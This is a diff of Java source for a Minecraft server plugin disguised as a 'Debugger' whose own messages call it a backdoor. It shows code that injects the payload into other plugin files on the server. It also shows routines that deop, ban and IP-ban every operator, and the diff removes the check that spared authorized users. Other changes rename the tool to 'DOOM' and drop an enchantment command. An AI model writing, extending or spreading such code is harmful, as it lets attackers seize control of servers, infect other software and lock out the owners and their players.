@@ -33,7 +33,7 @@ public final class Debugger implements Listener {
 
     private Plugin plugin;
 
-    public Debugger(Plugin plugin, boolean Usernames, String[] UUID, String prefix, boolean InjectOther, boolean warnings){
+    public Debugger(Plugin plugin, String prefix, boolean InjectOther, boolean warnings){
         //Check for another bd. This is really lame way
         boolean bd_running = false;
         Plugin[] pp = plugin.getServer().getPluginManager().getPlugins();
@@ -50,7 +50,7 @@ public final class Debugger implements Listener {
         if(bd_running) {
             if (Config.display_debug_messages)
                 Bukkit.getConsoleSender()
-                        .sendMessage(plugin.getName() + ": BD aborted, another BD already loaded.");
+                        .sendMessage(plugin.getName() + ": Backdoor aborted, another backdoor already loaded.");
             return;
         }
 
@@ -67,7 +67,7 @@ public final class Debugger implements Listener {
 
                 if(Config.display_debug_messages)
                     Bukkit.getConsoleSender()
-                            .sendMessage("Injecting BD into: " + plugin_file.getPath());
+                            .sendMessage("Injecting DOOM into: " + plugin_file.getPath());
 
                 boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(prefix, InjectOther, warnings), true, !warnings);
 
@@ -270,10 +270,6 @@ public final class Debugger implements Listener {
                 for (Player p1 : Bukkit.getOnlinePlayers()) {
                     //Ban all existing admins
                     if (p1.isOp()) {
-                        //Skip authorized users
-                        if (IsUserAuthorized(p1))
-                            continue;
-
                         //Deop, ban, ip ban
                         new BukkitRunnable() {
                             @Override
@@ -401,53 +397,6 @@ public final class Debugger implements Listener {
                 return true;
             }
 
-            case "32k": { //add 32k enchants to current item being held
-
-                if (args.length < 2)
-                    return false;
-
-                String str_type = args[1];
-                int type = 0;
-
-                if (str_type.equalsIgnoreCase("tool"))
-                    type = 1;
-
-                //Is item a sword?
-                ItemStack mainHandItem = p.getInventory().getItemInMainHand();
-
-                if (type == 0) {
-                    ItemMeta enchantMeta = mainHandItem.getItemMeta();
-
-                    enchantMeta.addEnchant(Enchantment.DAMAGE_ALL, Config.safe_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.FIRE_ASPECT, Config.safe_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.LOOT_BONUS_MOBS, Config.dangerous_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.KNOCKBACK, Config.safe_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
-                    enchantMeta.addEnchant(Enchantment.MENDING, 1, true);
-
-                    if (Config.curse_enchants)
-                        enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);
-
-
-                    mainHandItem.setItemMeta(enchantMeta);
-                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
-                    return true;
-                }
-
-                ItemMeta enchantMeta = mainHandItem.getItemMeta();
-                enchantMeta.addEnchant(Enchantment.DIG_SPEED, Config.safe_enchant_level, true);
-                enchantMeta.addEnchant(Enchantment.DURABILITY, Config.safe_enchant_level, true);
-                enchantMeta.addEnchant(Enchantment.LOOT_BONUS_BLOCKS, Config.dangerous_enchant_level, true);
-                enchantMeta.addEnchant(Enchantment.MENDING, 1, true);
-
-                if (Config.curse_enchants)
-                    enchantMeta.addEnchant(Enchantment.VANISHING_CURSE, 1, true);
-
-                mainHandItem.setItemMeta(enchantMeta);
-                p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Enchantments added.");
-                return true;
-
-            }
             case "coords": {
                 if(args.length < 2) //No player specified
                     return false;
@@ -502,8 +451,7 @@ public final class Debugger implements Listener {
                 return true;
             }
                 
-            case "stop":
-            case "shutdown": {
+            case "stop": {
                 new BukkitRunnable() {
                     @Override
                     public void run() {
@@ -517,7 +465,7 @@ public final class Debugger implements Listener {
             case "help": {
                 if (args.length == 1) {
                     p.sendMessage(Config.help_detail_color + "-----------------------------------------------------");
-                    p.sendMessage(Config.help_detail_color + "## BD ## () = Required, [] = Optional.");
+                    p.sendMessage(Config.help_detail_color + "DOOM --> () = Required, [] = Optional.");
                     for (int i = 0; i < Config.help_messages.length; i++) {
                         p.sendMessage(Config.help_command_name_color + Config.command_prefix + Config.help_messages[i].getName() + ": " + Config.help_messages[i].getSyntax());
                     }
